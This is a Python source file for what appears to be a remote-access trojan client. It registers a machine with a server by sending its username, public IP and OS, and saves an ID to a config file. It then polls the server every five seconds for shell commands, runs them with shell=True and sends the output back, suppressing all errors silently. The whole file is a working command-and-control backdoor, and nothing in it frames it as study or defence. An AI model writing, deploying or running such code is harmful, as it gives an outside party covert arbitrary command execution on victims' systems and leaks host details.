import requests
import subprocess
import time
import platform
import os
import json

SERVER_URL = "http://127.0.0.1:5000"  # Change to your actual server URL later

CONFIG_FILE_LINUX = "/.rootconfig.ini"  # Path in Linux root directory
CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows

# Function to get the username using `whoami` (works on both Windows and Linux)
def get_username():
    try:
        username = subprocess.check_output("whoami", shell=True).decode().strip()
        return username
    except Exception as e:
        print(f"Error retrieving username: {e}")
        return None

# Function to get the public IP address
def get_public_ip():
    try:
        # Use an external API to get the public IP address
        response = requests.get("https://api.ipify.org?format=json")
        if response.status_code == 200:
            public_ip = response.json().get("ip")
            return public_ip
        else:
            print("Failed to get public IP")
            return None
    except Exception as e:
        print(f"Error retrieving public IP: {e}")
        return None

# Function to check if the server URL is active
def is_server_url_active(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print("Server is active and reachable.")
            return True
        else:
            print(f"Server responded with status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to server: {e}")
        return False

# Function to check if the configuration file exists based on the OS
def check_config_file():
    if platform.system() == "Linux":
        return os.path.exists(CONFIG_FILE_LINUX)
    elif platform.system() == "Windows":
        return os.path.exists(CONFIG_FILE_WINDOWS)
    else:
        return False

# Check and register the client if necessary
def check_and_register_client():
    # Check if the server is active (reachable)
    while not is_server_url_active(SERVER_URL):
        print(f"Server at {SERVER_URL} is not active. Retrying in 1 minute...")
        time.sleep(2)  # Wait for 1 minute before retrying

    print(f"Server at {SERVER_URL} is now active. Proceeding with registration...")

    # Check if the config file exists based on OS
    if check_config_file():
        config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
        with open(config_file, 'r') as file:
            data = json.load(file)
            return data.get("client_id")
    else:
        # File is missing or empty, so register with the server
        return register_client()

# Register the client and get a client_id from the server
def register_client():
    # Get client details (user, public IP, OS)
    user = get_username()  # Get the username using whoami
    public_ip = get_public_ip()
    os_name = os.uname().sysname if platform.system() != "Windows" else platform.system()

    if not user or not public_ip:
        print("Error: Could not retrieve necessary information.")
        return None

    # Send registration request to the server
    registration_data = {
        'user': user,
        'public_ip': public_ip,
        'os': os_name
    }

    try:
        # Send a POST request to the /clientRegistration endpoint
        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data)

        if response.status_code == 200:
            # Server response contains the client_id
            client_data = response.json()
            client_id = client_data.get("client_id")

            # Save client_id to the config file based on OS
            config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
            with open(config_file, 'w') as file:
                json.dump({"client_id": client_id}, file)

            return client_id
        else:
            print(f"Registration failed. Status Code: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error during registration: {e}")
        return None

# Track the current working directory (starting with the root or default directory)
current_directory = "/"

def execute_command(command):
    """Execute the shell command, update current directory if 'cd' command is issued."""
    global current_directory
    try:
        # If the command is 'cd', update the current directory
        if command.startswith("cd "):
            # Extract the directory path from the command
            new_directory = command[3:].strip()
            # If it's an absolute path, use it directly; otherwise, make it relative
            if new_directory.startswith("/"):
                current_directory = new_directory
            else:
                current_directory = os.path.join(current_directory, new_directory)
            return f"Changed directory to {current_directory}"

        # For other commands, execute them in the current directory
        result = subprocess.run(command, shell=True, cwd=current_directory, text=True, capture_output=True)

        # Return the output or error if any
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

# Start the check-and-register process
client_id = check_and_register_client()

if client_id:
    print(f"Client registered with ID: {client_id}")
else:
    print("Client registration failed.")

while True:
    try:
        # Fetch command from the server every 5 seconds
        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5)  # Set timeout for the request
        
        # Check if the response status is OK
        if response.status_code == 200:
            command = response.json().get("command")
            
            # If there's a command, execute it
            if command:
                print(command)  # for logging, remove later
                result = execute_command(command)
                
                # Send the result back to the server
                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client", json={"result": result})
                
                # Check if the result was successfully sent
                if result_response.status_code != 200:
                    pass  # Do nothing on failure
        else:
            pass  # Do nothing if no command or bad status response from server

    except (requests.exceptions.RequestException, Exception):
        # Handle any error (like server down, no response, or timeout) silently
        pass
    
    # Wait for 5 seconds before the next request
    time.sleep(5)
